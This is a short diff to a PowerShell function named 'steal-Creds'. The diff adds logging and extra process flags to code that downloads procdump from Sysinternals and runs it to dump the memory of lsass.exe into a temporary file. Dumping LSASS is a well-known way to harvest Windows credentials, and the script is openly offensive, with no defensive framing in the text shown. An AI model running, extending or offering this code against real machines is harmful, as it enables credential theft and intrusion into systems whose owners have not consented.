@@ -96,7 +96,9 @@ function steal-Creds
 
         $current_loc = Get-Location
         $FileName = [System.IO.Path]::GetTempFileName().replace(".tmp", ".exe")
+        Write-Output "New FileName: [$FileName]"
         $DumpFile = [System.IO.Path]::GetTempFileName().replace(".tmp", ".dmp")
+        Write-Output "New DumpFile: [$DumpFile]"
         $url = "https://live.sysinternals.com/procdump.exe"
         
         Write-Output "Downloading procdump into [$FileName]"
@@ -104,7 +106,7 @@ function steal-Creds
         $wc.DownloadFile($url, $FileName)
         
         Unblock-File $FileName
-        Start-Process -FilePath $FileName -ArgumentList "-accepteula -accepteula -64 -ma lsass.exe $DumpFile"
+        Start-Process -FilePath $FileName -ArgumentList "-accepteula -accepteula -64 -ma lsass.exe $DumpFile" -NoNewWindow -PassThru -Verbose
         Write-Output "Dump file stored in: [$DumpFile]"
     
         Write-Output "Deleting procdump [$FileName] after 10 seconds"
